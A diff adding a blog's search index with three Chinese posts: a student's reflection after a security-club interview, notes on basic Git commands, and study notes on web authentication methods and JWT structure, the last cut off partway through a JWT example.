@@ -1,0 +1,1230 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>写在Vidar第一次面试之后</title>
+    <url>/2023/11/27/AfterVidarIntv/</url>
+    <content><![CDATA[<h2 id="写在开头"><a href="#写在开头" class="headerlink" title="写在开头"></a>写在开头</h2><blockquote>
+<p>是写给自己的，但不知道此时此刻是谁在看……</p>
+</blockquote>
+<p>在距离面试已经过去快30个小时的现在，感觉应该写点总结性的东西。首先是不能白白浪费这次机会，比较里面提到的很多东西我觉得还是应该好好想想；还有就是以此为节点能赶紧摆脱浑浑噩噩的状态，和大半个月了的生病状态做个告别吧。</p>
+<h2 id="关于面试"><a href="#关于面试" class="headerlink" title="关于面试"></a>关于面试</h2><p>其实走进协会看到ek1ng哥就感觉要上强度了 <del>然后果然面试就变成了ek1ng和学长们的小课堂</del></p>
+<p>不得不说收获很多东西，也认识到自己确实是很多很多东西不会，甚至是不了解的 <del>这还要说啊喂！</del></p>
+<p>整体确实是按照学习路线来的，但是感觉自己太过拘束在学习路线本身，忘记真的去做到<code>勿以浮沙筑高台</code>这句话了。<del>我是沙雕思密达</del> 所以决定趁脑子里多多少少还有一点东西留着的时候记录一下，也好给之后的学习做个参考。当然要学的东西还有很多很多很多很多很多，绝对不是仅仅只有这些好么，Kira。</p>
+<ul>
+<li>工作环境，得把笔记本刷成<code>Linux</code>了感觉，感觉还是应该好好搭个环境，把很多方面的任务从台式迁移到笔记本上，毕竟感觉这台轻薄本还是能撑得住的。另外记得要装修一下<code>shell</code>嗯。不知道上什么系统，感觉真的有时间折腾还是原生的<code>arch</code></li>
+<li>语言，首先是学学<code>java</code>，要多对比一下不同语言之间的差异、了解一下语言的特性  <em>感觉这个确实挺重要的</em>，然后多试试各种框架然后找一个专精可能会比较好？</li>
+<li><code>git</code>，学一下协作方面的功能和实现，感觉主要是对<code>merge</code>这个命令的了解不够</li>
+<li><code>docker</code>，加深一下了解，比如镜像和容器的区别，个人感觉还有容器网络之类的实现</li>
+<li>数据库，可以多尝试一下不同的种类，同时对比一下不同数据库的区别以及实现原理，不能忘了<code>NoSQL</code>方向</li>
+<li>HTTP，感觉看完了书很多东西还是没记住，找个空理一下请求头请求体的内容、握手的意义、整体结构什么的……</li>
+<li>net，就感觉还是什么都不懂，计网重新开始一下吧，毕竟那个<code>all in boom</code>还是想玩一玩</li>
+<li>操作系统，Linux相关知识，可能涉及更深的？</li>
+<li>web开发，一个是前端知识要学起来，语言学习和页面编写，以及控制台的功能使用（调试之类的）；还有一个是多去了解一下各种web服务器软件（<code>Apache</code>、<code>Nginx</code>、<code>Tomcat</code>…），差异对比、实现方式之类的？</li>
+<li>web安全，多刷点CTF题，复现CVE，看看代码审计里面的<code>java安全漫谈</code>，<code>Hack the box</code>？ </li>
+<li><em>ek1ng给的三个CVE是<code>jeecgboot freemaker ssti</code>、<code>activemq 61616 rce</code>、<code>jumpserver cve-2023-42820 伪随机数账号接管</code></em></li>
+</ul>
+<h2 id="随便说说？"><a href="#随便说说？" class="headerlink" title="随便说说？"></a>随便说说？</h2><p>其实说对结果完全不在意肯定是假话，但是确实也挺能接受的，毕竟是半吊子AK的Hgame-mini web，感觉不论是Ec3o还是Mysid师傅都比我厉害很多（笑。当然我也希望这是暂时的，至少在某些方面是暂时的……</p>
+<p>回头想想其实主要问题除了能力水平，还有精力和规划上。自己通信专业的学习路线和web这块重叠感觉不能说完全没有只能说基本不沾。再加上自己其实没有花特别多时间或者仔细规划过转专业卷绩点这方面的事，确实也被很多东西分散了时间。原来被说对大学的新鲜感还会觉得自己能conquer这些工作，但实际上之前这段时间确实感受到无法多开。即使有天赋的人大多数时候也会选择专注吧，更别提我这种没什么天赋的（</p>
+<p>认真考虑后决定好好整理一下自己的生活。其实有的时候搞不懂自己如何评价哪个环境更适合自己，但是不得不承认，可能我在踏入协会的那一刻就已经在对比中做出了选择。可能和一直以来的经历有关，很多时候会很追求一种归属感。在印象里二教608的感觉更像是公司，各自在做着自己的工作。协会就给我一种很复杂的感觉。可能性格使然会更喜欢这种复杂的感觉。Who knows.可能对我来说前者会更有压迫感吧，又或者说是给不了我想要的某些东西。</p>
+<p>所以权衡以后艰难地推掉了RM那边的招新任务。个人很讨厌影响别人；我自己怎么样都好，但是影响到别人对我的良心很不好，负罪感很重。所以和组队快两周的队友提了这事，相比在后面做不好影响到他进组，还是趁现在合作还没开始就说清楚会更好吧。所幸还有嵌入式的同学没组上队，不然我肯定会选择好好做掉小车控制方面的工作的……同时也推掉了学长服务器运维的学习，留下了陪我的可能就只有那套本来想用来练练zfs文件系统和Ubuntu服务器的小主机了（</p>
+<p>接下来的事应该就只有卷卷卷卷卷绩点，看看能不能转计算机，或者卓越网安这样；还有就是很重要的web方面的继续学学学学学学了，没通过这次机会就Hgame好好表现啦~ 我会杀回来的！</p>
+<p>做出选择之后就应该用努力去填上差距，虽然这或许是我一直以来做的最差的东西了吧。</p>
+<p>沉淀（</p>
+<blockquote>
+<p>哦不对，最重要的是这周末的期中考捏 &#x3D;_&#x3D;&#96;</p>
+<p>不管是谁，看到这都请在今后保持开心吧~</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>Kira的碎碎念</category>
+        <category>2023</category>
+      </categories>
+      <tags>
+        <tag>阶段性总结</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>0x01 Git的基本使用</title>
+    <url>/2023/11/20/BabyGit/</url>
+    <content><![CDATA[<blockquote>
+<p>Learn about the version control system, Git, and how it works with GitHub.  </p>
+<p>​										<a class="link"   href="https://docs.github.com/en/get-started/using-git/about-git" >About Git - GitHub Docs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+</blockquote>
+<h2 id="Introductio"><a href="#Introductio" class="headerlink" title="Introductio"></a>Introductio</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>Vidar-Team web方向学习计划第一弹！    </p>
+<p><del>最不需要introduction的一集</del> 很重要，学多  </p>
+<p>虽然存在GitHub Desktop的可视化使用方式，但是只有命令行（服务器管理、物联网设备、<del>不喜欢图形界面</del>）就只能原始一点啦     </p>
+<h2 id="Basic-Git-commands"><a href="#Basic-Git-commands" class="headerlink" title="Basic Git commands"></a>Basic Git commands</h2><p>抄一段doc先</p>
+<blockquote>
+<ul>
+<li><code>git init</code> initializes a brand new Git repository and begins tracking an existing directory. It adds a hidden subfolder within the existing directory that houses the internal data structure required for version control.</li>
+<li><code>git clone</code> creates a local copy of a project that already exists remotely. The clone includes all the project’s files, history, and branches.</li>
+<li><code>git add</code> stages a change. Git tracks changes to a developer’s codebase, but it’s necessary to stage and take a snapshot of the changes to include them in the project’s history. This command performs staging, the first part of that two-step process. Any changes that are staged will become a part of the next snapshot and a part of the project’s history. Staging and committing separately gives developers complete control over the history of their project without changing how they code and work.</li>
+<li><code>git commit</code> saves the snapshot to the project history and completes the change-tracking process. In short, a commit functions like taking a photo. Anything that’s been staged with <code>git add</code> will become a part of the snapshot with <code>git commit</code>.</li>
+<li><code>git status</code> shows the status of changes as untracked, modified, or staged.</li>
+<li><code>git branch</code> shows the branches being worked on locally.</li>
+<li><code>git merge</code> merges lines of development together. This command is typically used to combine changes made on two distinct branches. For example, a developer would merge when they want to combine changes from a feature branch into the main branch for deployment.</li>
+<li><code>git pull</code> updates the local line of development with updates from its remote counterpart. Developers use this command if a teammate has made commits to a branch on a remote, and they would like to reflect those changes in their local environment.</li>
+<li><code>git push</code> updates the remote repository with any commits made locally to a branch.</li>
+</ul>
+</blockquote>
+<p>感觉主要常用的指令还是<code>git clone</code> <code>git add</code> <code>git commit</code> <code>git pull</code> 和 <code>git push</code>  </p>
+<p>在本地创建repository的话还要加上<code>git init</code>和<code>git remote</code></p>
+<p>具体可以参考GitHub Docs-About Git-Example    <em>赞美官方文档</em>  </p>
+<p>btw，<code>git checkout</code> 提供的分支管理在参与at0m学长的项目的时候有用过，主要是为了隔离开发和使用的分支，很棒的样子但是感觉我还用不到（x  </p>
+<h2 id="具体参数及示例"><a href="#具体参数及示例" class="headerlink" title="具体参数及示例"></a>具体参数及示例</h2><ul>
+<li><code>git clone https://github.com/USERNAME/REPOSITORY.git</code> <ul>
+<li>应该是最常见的命令了，通过https的方式从remote repository获得代码<em>也可以使用ssh或者GitHub Cli，暂时只用过https和ssh</em></li>
+<li>通过阅读doc中描述的本地行为，可以知道该本地Git repo会以<code>origin</code> 指向原url，也就是<code>REMOTE-NAME</code> ，同时现在的默认<code>BRANCH-NAME</code>是<code>main</code></li>
+</ul>
+</li>
+<li><code>git push REMOTE-NAME BRANCH-NAME</code><ul>
+<li>结合上面的内容可以明白example中<code>git push origin main</code>的意思</li>
+<li>同时将<code>BRANCH-NAME</code> 改成<code>LOCAL-BRANCH-NAME:REMOTE-BRANCH-NAME</code> 可以在push的同时完成对远程仓库的rename操作</li>
+<li><code>tag</code>操作涉及version管理，暂时搁置吧（x</li>
+</ul>
+</li>
+<li><code>git fetch REMOTE-NAME</code><ul>
+<li>获取更新</li>
+</ul>
+</li>
+<li><code>git merge REMOTE-NAME/BRANCH-NAME</code><ul>
+<li>合并仓库</li>
+</ul>
+</li>
+<li><code>git pull REMOTE-NAME BRANCH-NAME</code> <ul>
+<li>fetch+merge</li>
+</ul>
+</li>
+</ul>
+<p>从写的东西就能看出来对<code>git pull</code>系指令感觉还不太了解  </p>
+<p>可能用着用着就好了吧（x</p>
+<blockquote>
+<p>关于远程仓库的指令好几个没有介绍，可以参考0x02上云部分的内容    </p>
+<p><del>其实是懒得写了</del> 红豆泥私密马赛！</p>
+</blockquote>
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<p>感觉也没写多少，总之翻了翻doc，我这个用GitHub Desktop比较多的人还是要好好学习（</p>
+]]></content>
+      <categories>
+        <category>泛用</category>
+        <category>git</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>0x05 鉴权及jwt分析</title>
+    <url>/2023/11/28/Auth_JWT/</url>
+    <content><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><blockquote>
+<p>勿以浮沙筑高台</p>
+</blockquote>
+<p>这篇其实时间跨度很长，从期中考试前的C语言课（嗯）到更新这天，主要还是根据之前列的东西慢慢学吧~ 这段时间变化和想法都挺多的，不过就留到其他时候再说吧，这里专注于鉴权和JWT~</p>
+<h2 id="主要鉴权方法"><a href="#主要鉴权方法" class="headerlink" title="主要鉴权方法"></a>主要鉴权方法</h2><p>主要有以下几类</p>
+<ul>
+<li>HTTP Basic Authentication</li>
+<li>Session-Cookie</li>
+<li>Token</li>
+<li>OAuth</li>
+<li>LDAP</li>
+</ul>
+<p>还有一些基于基本认证方式搭建的鉴权体系，比如<code>SSO</code></p>
+<h2 id="HTTP-Basic-Authentication"><a href="#HTTP-Basic-Authentication" class="headerlink" title="HTTP Basic Authentication"></a>HTTP Basic Authentication</h2><blockquote>
+<p>一种很简单的认证方式，所以同时也很不安全</p>
+</blockquote>
+<p>基于HTTP请求，用请求头<code>Authorization</code>携带认证信息</p>
+<p>在没有认证信息的情况下服务器会返回<code>401</code>状态，带有<code>WWW-Anthenticate</code>头指出安全域</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/private/index.html</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">401</span> Authorization Required</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>HTTPd/1.0</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Sat, 27 Nov 2004 10:18:15 GMT</span><br><span class="line"><span class="attribute">WWW-Authenticate</span><span class="punctuation">: </span>Basic realm=&quot;Secure Area&quot;</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>311</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"> <span class="string">&quot;http://www.w3.org/TR/1999/REC-html401-19991224/loose.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">TITLE</span>&gt;</span>Error<span class="tag">&lt;/<span class="name">TITLE</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;text/html; charset=ISO-8859-1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  <span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">H1</span>&gt;</span>401 Unauthorized.<span class="tag">&lt;/<span class="name">H1</span>&gt;</span><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>
+
+<p>ID <code>Aladdin</code>  Password <code>open sesame</code></p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/private/index.html</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</span><br></pre></td></tr></table></figure></div>
+
+<p>当然不需要交互直接发送<code>Authorization</code>也可以</p>
+<p>采用<code>base64</code>对<code>ID:Password</code>格式的认证信息进行编码，本质是一种明文传输，更适合在相对安全的环境中采用（好像可以在<code>https</code>中用）</p>
+<p>优点是广泛支持,设置简便</p>
+<p>关于<code>Apache</code>和<code>Nginx</code>的设置可以参见<a class="link"   href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Authentication#%E4%BD%BF%E7%94%A8_apache_%E9%99%90%E5%88%B6%E8%AE%BF%E9%97%AE%E5%92%8C_basic_%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81" >HTTP 身份验证 - HTTP | MDN <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="Digest-Authentication"><a href="#Digest-Authentication" class="headerlink" title="Digest Authentication"></a>Digest Authentication</h3><blockquote>
+<p>感觉把摘要认证视为对HTTP基本认证的小优化会更好</p>
+</blockquote>
+<p>本质是将明文传输变成携带验证方式的传输，通过摘要值可以对信息进行校验、防篡改（？</p>
+<p>在摘要认证中，服务器验证客户端发送的摘要的正确性的步骤如下：</p>
+<ol>
+<li>服务器收到客户端发送的摘要后，会根据摘要中的信息和服务器存储的用户密码进行计算，生成一个期望的摘要值。</li>
+<li>然后，服务器将生成的期望摘要值与客户端发送的摘要值进行比较。</li>
+<li>如果两个摘要值相匹配，则服务器会验证通过，允许客户端继续访问所请求的资源。</li>
+<li>如果两个摘要值不匹配，则服务器会拒绝客户端的请求，并返回相应的错误信息。</li>
+</ol>
+<p>给个小示例</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">401</span> Authorization Required</span><br><span class="line"><span class="attribute">WWW-Authenticate</span><span class="punctuation">: </span>Digest realm=&quot;example&quot;, qop=&quot;auth&quot;, nonce=&quot;dcd98b7102dd2f0e8b11d0f600bfb0c093&quot;, opaque=&quot;5ccc069c403ebaf9f0171e9517f40e41&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.0</span></span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Digest username=&quot;alice&quot;, realm=&quot;example&quot;, nonce=&quot;dcd98b7102dd2f0e8b11d0f600bfb0c093&quot;, uri=&quot;/dir/index.html&quot;, qop=auth, nc=00000001, cnonce=&quot;0a4f113b&quot;, response=&quot;6629fae49393a05397450978507c4ef1&quot;, opaque=&quot;5ccc069c403ebaf9f0171e9517f40e41&quot;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Session-Cookie"><a href="#Session-Cookie" class="headerlink" title="Session-Cookie"></a>Session-Cookie</h2><blockquote>
+<p>在服务器中储存会话数据，基于<code>session_id</code>进行识别调用</p>
+</blockquote>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><blockquote>
+<p>使无状态的http可以承载状态信息</p>
+</blockquote>
+<p><code>Cookie</code>是服务器发送到用户浏览器并保存在本地的一小块数据。浏览器会存储<code>cookie</code>并在下次向同一服务器再发起请求时携带并发送到服务器上。</p>
+<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>text/html</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>yummy_cookie=choco</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>tasty_cookie=strawberry</span><br></pre></td></tr></table></figure></div>
+
+<p>设定Cookie时可以设定一些参数，<code>Expires</code> 过期时间，<code>Secure</code> <code>HttpOnly</code>限制访问，<code>Domain</code> <code>Path</code>定义Cookie作用域，<code>SameSite</code>设置跨站发送限制，还有<code>__Host-</code>和<code>__Secure-</code>前缀用于断言特定事实</p>
+<p>主要有三方面功能：</p>
+<ul>
+<li><strong>会话状态管理</strong>  如用户登录状态、购物车、游戏分数或其他需要记录的信息</li>
+<li><strong>个性化设置</strong>  如用户自定义设置、主题和其他设置</li>
+<li><strong>浏览器行为跟踪</strong>  如跟踪分析用户行为等</li>
+</ul>
+<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><ol>
+<li>服务端在接收到来自客户端的首次访问时，会自动创建 Session（将 Session 保存在内存中，也可以保存在 Redis 中），然后给这个 Session 生成一个唯一的标识字符串会话身份凭证 <code>session_id</code>（即 <code>sid</code>），并在响应头 <code>Set-Cookie</code> 中设置这个唯一标识符</li>
+<li>（非必须）签名，对 <code>sid</code> 进行加密处理，服务端会根据这个 <code>secret</code> 密钥进行解密</li>
+<li>浏览器收到请求响应后会解析响应头，并自动将 <code>sid</code> 保存在本地 Cookie 中，浏览器在下次 HTTP 请求时请求头会自动附带上该域名下的 Cookie 信息</li>
+<li>服务端在接收客户端请求时会去解析请求头 Cookie 中的 <code>sid</code>，然后根据这个 <code>sid</code> 去找服务端保存的该客户端的 <code>sid</code>，然后判断该请求是否合法</li>
+<li>一旦用户登出，服务端和浏览器将会同时销毁各自保存的会话 ID，服务端会根据数据库验证会话身份凭证，如果验证通过，则继续处理</li>
+</ol>
+<p>流程可以参考下图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x07/session-cookie.jpg"
+                      alt="session_process"
+                ></p>
+<h3 id="and-More"><a href="#and-More" class="headerlink" title="and More"></a>and More</h3><p>session和cookie还是存在很多区别的，详见<a class="link"   href="https://wangxiaoxi.cn/posts/http-cookie/" >Cookie和Session的区别 | Xiaoxi’Blog <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>session方案在内存占用和安全方面是存在不足的</p>
+<h2 id="Token认证"><a href="#Token认证" class="headerlink" title="Token认证"></a>Token认证</h2><blockquote>
+<p>很多公有API和开发框架的内部API调用都是基于Token认证</p>
+</blockquote>
+<p>Token 和 Session-Cookie 认证方式中的 Session ID 不同，并非只是一个标识符。Token 一般会包含用户的相关信息，通过验证 Token 不仅可以完成 <code>身份校验</code>，还可以获取 <code>预设的信息</code> 。</p>
+<p>流程中的主要特点：</p>
+<ol>
+<li>Token储存在客户端</li>
+<li>后续Token被附带于<code>Authorization</code>字段中，</li>
+<li>客户端负责校验Token的结构内容是否符合要求</li>
+</ol>
+<p>具体流程如图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x07/Token.jpg"
+                      alt="Token_process"
+                ></p>
+<p>优点：服务端无状态，无需访问远程访问或数据库，支持跨域跨程序调用，可以有效避免CSRF（无cookie）</p>
+<p>缺点：更大占带宽，需要解密消耗性能</p>
+<blockquote>
+<p>详情请见后文JWT章节</p>
+</blockquote>
+<h3 id="Session-Cookie-和-Token-的对比"><a href="#Session-Cookie-和-Token-的对比" class="headerlink" title="Session-Cookie 和 Token 的对比"></a>Session-Cookie 和 Token 的对比</h3><p>Session-Cookie 认证仅仅靠的是 <code>sid</code> 这个生成的唯一标识符，服务端需要根据客户端传来的 <code>sid</code> 查询保存在服务端 Session 里保存的登录状态，当存储的信息数据量超过一定量时会影响服务端的处理效能。而且 Session-Cookie 认证需要靠浏览器的 Cookie 机制实现，如果遇到原生 NativeAPP 时这种机制就不起作用了，或是浏览器的 Cookie 存储功能被禁用，也是无法使用该认证机制实现鉴权的。</p>
+<p>Token 认证机制特别的是，实质上登录状态是用户登录后存放在客户端的，服务端不会充当保存 <code>用户信息凭证</code> 的角色，当每次客户端请求时附带该凭证，只要服务端根据定义的规则校验是否匹配和合法即可，客户端存储的手段也不限于 Cookie，可以使用 Web Storage 等其他缓存方式。</p>
+<p>简单来说，Session-Cookie 机制限制了客户端的类型，而 Token 验证机制丰富了客户端类型。而且Token机制更像是一种框架，可供用户更灵活地构建鉴权微服务</p>
+<h2 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h2><blockquote>
+<p>选择——“通过第三方认证登录</p>
+</blockquote>
+<p>OAuth（开放授权）是一个开发标准，允许用户授权 <code>第三方网站</code> 访问他们存储在另外的服务提供商中的信息，而不需要接触到用户名和密码。为了保护数据的安全和隐私，第三方网站访问用户数据前都需要 <code>显式地向用户征求授权</code>。我们常见的 OAuth 认证服务的厂商有微信、QQ、支付宝等。</p>
+<p>OAuth 协议又有 1.0 和 2.0 两个版本，2.0 版整个授权验证流程更简单更安全，也是目前最主要的用户身份验证和授权方式。</p>
+<p>应用场景有：第三方应用的接入、微服务鉴权互信、接入第三方平台、第一方密码登录等。</p>
+<p>具体看这篇：<a class="link"   href="https://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html" >理解OAuth 2.0 - 阮一峰的网络日志 (ruanyifeng.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><blockquote>
+<p>有提到LDAP可以实现SSO是一种误区</p>
+</blockquote>
+<p> 轻量目录访问协议<code>Lightweight Directory Access Protocol</code>，一个开放、广泛被使用的工业标准（IEFT、RFC）。企业级软件也通常具备 *<em>支持 LDAP</em>- 的功能，比如 Jira、Confluence、OpenVPN 等，企业也经常采用 LDAP 服务器来作为企业的认证源和数据源。</p>
+<p>它的主要功能点或场景：</p>
+<ul>
+<li>作为数据源它可以用于存储<ul>
+<li>企业的组织架构树</li>
+<li>企业员工信息</li>
+<li>证书信息</li>
+<li>会议室，打印机等等资源</li>
+</ul>
+</li>
+<li>作为认证源，它也有多种用途<ul>
+<li>存储用户的密码</li>
+<li>对外提供 LDAP 协议的认证方式（通过 LDAP BIND 协议来校验用户名和密码）</li>
+<li>密码策略（密码复杂度，历史密码记录，用户锁定等等）</li>
+</ul>
+</li>
+</ul>
+<h2 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h2><blockquote>
+<p>单点登录<code>Single Sign-on</code>，在多系统集群中的</p>
+</blockquote>
+<h3 id="同域-SSO（Session-Cookie）"><a href="#同域-SSO（Session-Cookie）" class="headerlink" title="同域 SSO（Session-Cookie）"></a>同域 SSO（Session-Cookie）</h3><blockquote>
+<p>实际就是利用Session-Cookie的特性</p>
+</blockquote>
+<p>当存在两个相同域名下的系统 A <code>a.abc.com</code> 和系统 B <code>b.abc.com</code> 时，以下为他们实现 SSO 的步骤：</p>
+<ol>
+<li>用户访问某个子系统时（例如 <code>a.abc.com</code>），如果没有登录，则跳转至 SSO 认证中心提供的登录页面进行登录</li>
+<li>登录认证后，服务端把登录用户的信息存储于 Session 中，并为用户生成对应的会话身份凭证附加在响应头的 <code>Set-Cookie</code> 字段中，随着请求返回写入浏览器中，并回跳到设定的子系统链接中</li>
+<li>下次发送请求时，当用户访问同域名的系统 B 时，由于 A 和 B 在相同域名下，也是 <code>abc.com</code>，浏览器会自动带上之前的 Cookie。此时服务端就可以通过该 Cookie 来验证登录状态了。</li>
+</ol>
+<h3 id="跨域-SSO（CAS）"><a href="#跨域-SSO（CAS）" class="headerlink" title="跨域 SSO（CAS）"></a>跨域 SSO（CAS）</h3><blockquote>
+<p>其实这个才是SSO的标准实现，基于CAS</p>
+</blockquote>
+<p><strong>CAS</strong>（Central Authentication Service）中央授权服务，本身是一个开源协议，分为 1.0 版本和 2.0 版本。1.0 称为基础模式，2.0 称为代理模式，适用于存在非 Web 应用之间的单点登录。</p>
+<p>来张快乐简图</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/post/0x07/CAS.jpeg"
+                      alt="CAS_process"
+                ></p>
+<p>Sir,this way! <a class="link"   href="https://www.cnblogs.com/wangsongbai/p/10299655.html" >一篇文章彻底弄懂CAS实现SSO单点登录原理 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><blockquote>
+<p>压轴重点，把JWT单独拉出来分析一下   <em>( 别问为什么了求你了(-_-） )</em></p>
+</blockquote>
+<p>JWT是Auth0提出的，以下信息主要来自<a class="link"   href="https://jwt.io/" >jwt.io <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>放一点JWT的缺点</p>
+<ol>
+<li><strong>过期时间问题</strong>：由于服务端不保存 Session 状态，因此无法在使用过程中废止某个 Token，或是更改 Token 的权限。也就是说，一旦 JWT 签发，在到期之前就会始终有效，除非服务端部署额外的逻辑。因此如果是浏览器端应用的话，使用 JWT 认证机制还需要设计一套 JWT 的主动更新删除的机制，这样就增加了系统的复杂性。</li>
+<li><strong>安全性</strong>：由于 JWT 的 Claims 是 Base64 编码的，并没有加密，因此 JWT 中不能存储敏感数据</li>
+<li><strong>性能问题</strong>：JWT 占用空间过大，Cookie 限制一般是 4k，可能会无法容纳，所以 JWT 一般放 LocalStorage 里面，并且用户在系统的每次 HTTP 请求都会把 JWT 携带在 Header 里面，HTTP 请求的 Header 可能比 Body 还要大。</li>
+</ol>
+<p>接下来分析一下JWT的结构</p>
+<p>标准形式下由三个部分构成，用<code>.</code>隔开；三部分如下</p>
+<ul>
+<li>Header 头部</li>
+<li>Payload 载荷</li>
+<li>Signature 签名</li>
+</ul>
+<p>所以就像这样 <code>xxxxx.yyyyy.zzzzz</code></p>
+<h3 id="头部"><a href="#头部" class="headerlink" title="头部"></a>头部</h3><p>由类型<code>JWT</code>和加密形式构成</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>然后头部会被Base64URL加密</p>
+<h3 id="载荷"><a href="#载荷" class="headerlink" title="载荷"></a>载荷</h3><p>因为可以被直接解密，所以存放一些不敏感信息</p>
+<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Jehoshaphat Tse&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1441593502</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1441594722</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;www.example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mrsingsing@example.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;admin&quot;</span><span 